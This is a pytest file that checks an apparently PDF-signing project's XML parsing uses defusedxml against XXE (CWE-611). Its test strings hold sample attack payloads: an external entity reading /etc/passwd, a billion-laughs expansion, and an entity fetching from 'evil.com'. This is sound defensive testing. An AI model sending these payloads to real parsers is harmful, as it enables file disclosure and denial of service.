"""
test_xml_security.py - Tests for XML security (XXE prevention)

Tests that XML parsing uses defusedxml to prevent XXE attacks.
CWE-611: Improper Restriction of XML External Entity Reference
"""

# Test that defusedxml is used in the codebase
import inspect

import defusedxml.ElementTree
import pytest
from defusedxml import DTDForbidden, EntitiesForbidden


class TestDefusedXMLUsage:
    """Test that defusedxml is used for XML parsing."""

    def test_lotl_fetcher_uses_defusedxml(self):
        """LOTL fetcher should use defusedxml for parsing (not stdlib ET)."""

        from pdfsigner.core.eidas import lotl_fetcher

        source = inspect.getsource(lotl_fetcher)
        assert "import defusedxml.ElementTree as ET" in source
        # TYPE_CHECKING import of xml.etree.ElementTree.Element is safe (type hints only)
        assert "defusedxml" in source

    def test_tsl_parser_uses_defusedxml(self):
        """TSL parser should use defusedxml for parsing (not stdlib ET)."""

        from pdfsigner.core.eidas import tsl_parser

        source = inspect.getsource(tsl_parser)
        assert "import defusedxml.ElementTree as ET" in source
        assert "defusedxml" in source


class TestXXEPrevention:
    """Test that XXE attacks are prevented."""

    def test_xxe_entity_expansion_blocked(self):
        """External entity expansion should be blocked."""
        # Malicious XML with external entity
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE foo [
            <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>
        """

        # defusedxml should block this
        with pytest.raises((DTDForbidden, EntitiesForbidden)):
            defusedxml.ElementTree.fromstring(malicious_xml)

    def test_billion_laughs_blocked(self):
        """Billion laughs attack should be blocked."""
        # Exponential entity expansion attack
        malicious_xml = """<?xml version="1.0"?>
        <!DOCTYPE lolz [
            <!ENTITY lol "lol">
            <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
            <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        ]>
        <lolz>&lol3;</lolz>
        """

        # defusedxml should block this
        with pytest.raises((DTDForbidden, EntitiesForbidden)):
            defusedxml.ElementTree.fromstring(malicious_xml)

    def test_valid_xml_parses_correctly(self):
        """Valid XML without attacks should parse correctly."""
        valid_xml = """<?xml version="1.0"?>
        <root>
            <child attribute="value">Text content</child>
        </root>
        """

        tree = defusedxml.ElementTree.fromstring(valid_xml)
        assert tree.tag == "root"
        assert tree.find("child").text == "Text content"
        assert tree.find("child").get("attribute") == "value"

    def test_tsl_like_xml_parses(self):
        """TSL-like XML structure should parse correctly."""
        tsl_xml = """<?xml version="1.0" encoding="UTF-8"?>
        <TrustServiceStatusList xmlns="http://uri.etsi.org/02231/v2#">
            <SchemeInformation>
                <TSLVersionIdentifier>5</TSLVersionIdentifier>
                <TSLSequenceNumber>42</TSLSequenceNumber>
                <TSLType>http://uri.etsi.org/TrstSvc/TrustedList/TSLType/EUlistofthelists</TSLType>
            </SchemeInformation>
            <TrustServiceProviderList>
                <TrustServiceProvider>
                    <TSPInformation>
                        <TSPName>Test TSP</TSPName>
                    </TSPInformation>
                </TrustServiceProvider>
            </TrustServiceProviderList>
        </TrustServiceStatusList>
        """

        tree = defusedxml.ElementTree.fromstring(tsl_xml)

        # Define namespace
        ns = {"tsl": "http://uri.etsi.org/02231/v2#"}

        version = tree.find("tsl:SchemeInformation/tsl:TSLVersionIdentifier", ns)
        assert version is not None
        assert version.text == "5"


class TestDefusedXMLFeatures:
    """Test defusedxml security features."""

    def test_forbid_dtd_with_entities(self):
        """DTD with entity definitions should be blocked."""
        xml_with_dtd_entity = """<?xml version="1.0"?>
        <!DOCTYPE root [
            <!ENTITY test "test_value">
        ]>
        <root>&test;</root>
        """

        # defusedxml blocks DTDs that define entities
        with pytest.raises((DTDForbidden, EntitiesForbidden)):
            defusedxml.ElementTree.fromstring(xml_with_dtd_entity)

    def test_forbid_external_entities(self):
        """External entities should be forbidden."""
        xml_with_external = """<?xml version="1.0"?>
        <!DOCTYPE root [
            <!ENTITY external SYSTEM "http://evil.com/payload.dtd">
        ]>
        <root>&external;</root>
        """

        with pytest.raises((DTDForbidden, EntitiesForbidden)):
            defusedxml.ElementTree.fromstring(xml_with_external)
